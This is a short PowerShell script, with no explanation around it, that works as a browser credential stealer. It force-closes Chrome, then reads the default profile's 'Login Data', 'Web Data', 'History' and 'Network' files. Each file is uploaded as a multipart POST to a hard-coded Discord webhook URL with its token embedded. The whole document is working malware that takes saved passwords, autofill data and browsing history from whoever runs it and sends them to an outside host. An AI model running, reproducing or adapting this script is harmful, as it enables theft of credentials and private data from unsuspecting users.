Get-Process "chrome" | Stop-Process -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 1
$chromeUserDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
$webhookUrl = "https://discord.com/api/webhooks/1208762543263326279/mLDNFnzaa6YhmWDAkgEgu3PAX6pM-8A8UDo5bD2Pdncqa9y3Rz23yD0ZlP5jdjv8Q3tq"
function SendFile($filePath, $webhookUrl) {
    if (Test-Path $filePath) {
        $fileContent = Get-Content $filePath -Raw
        $boundary = [System.Guid]::NewGuid().ToString()
        $LF = "`r`n"
        $payload = "--$boundary$LF"
        $payload += "Content-Disposition: form-data; name=`"file`"; filename=`"$($filePath.Split('\')[-1])`"$LF"
        $payload += "Content-Type: application/octet-stream$LF$LF"
        $payload += $fileContent
        $payload += $LF
        $payload += "--$boundary--$LF"
        Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $payload
    }
}
SendFile "$chromeUserDataPath\Web Data" $webhookUrl
SendFile "$chromeUserDataPath\History" $webhookUrl
SendFile "$chromeUserDataPath\Login Data" $webhookUrl
SendFile "$chromeUserDataPath\Network" $webhookUrl
